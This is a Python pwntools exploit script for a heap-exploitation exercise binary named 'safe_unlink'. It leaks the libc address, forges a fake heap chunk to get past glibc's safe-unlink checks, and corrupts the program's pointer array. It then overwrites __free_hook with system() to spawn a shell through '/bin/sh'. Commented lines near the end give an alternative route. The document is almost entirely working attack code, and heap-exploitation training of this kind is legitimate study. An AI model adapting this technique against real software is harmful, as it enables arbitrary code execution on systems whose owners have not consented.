#!/usr/bin/python3
from pwn import *

exe = "./safe_unlink"
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

gs = '''
init-pwndbg
c
'''.format(**locals())

def start(argv=[], *a, **kw):
    if args.GDB:
        context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
        return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

index = 0

def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")

io = start()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1


# Print the address of m_array, 
# where the program stores pointers to its allocated chunks.
log.info(f"m_array @ 0x{elf.sym.m_array:02x}")

# Request 2 0x90 chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)
''' bypass contraints
fd->bk != p || bk->fd != p
'''
fd = elf.sym.m_array - 24
bk = elf.sym.m_array - 16
prev_size = 0x80
fake_size = 0x90
content = flat({
    0:[
        # fake chunk
        0, # prev_size field
        0x80, #size field to math prev_size field of this chunk
        fd,
        bk,
        p8(0)*0x60,
        prev_size,
        fake_size,
    ]
})
edit(chunk_A, content)

# consolidation with our fake chunk
# and unlinking
free(chunk_B)

# m_array entry point to it's addr before 3 qword
# dont - 16 becauz it already user data
# Free m_array entry 0, which holds the address of the "/bin/sh" string before the free hook.
# This triggers system("/bin/sh").
edit(0, p64(0)*3 + p64(libc.sym.__free_hook - 8))
edit(0, b'/bin/sh\x00' + p64(libc.sym.system))
free(0)

io.interactive()
# Alternatively, use the "edit" option to overwrite the first entry in m_array again with the address of the free hook.
# Set the request size value of this entry to 8 and set up a pointer to an existing "/bin/sh" string in another m_array entry.
#edit(0, b"X"*0x18 + p64(libc.sym.__free_hook) + p64(0x08) + p64(next(libc.search("/bin/sh"))))

# Use the "edit" option once more to overwrite the free hook with the address of system().
#edit(0, p64(libc.sym.system))

# Free the m_array entry that holds the address of the "/bin/sh" string in libc to trigger system("/bin/sh").
#free(1)
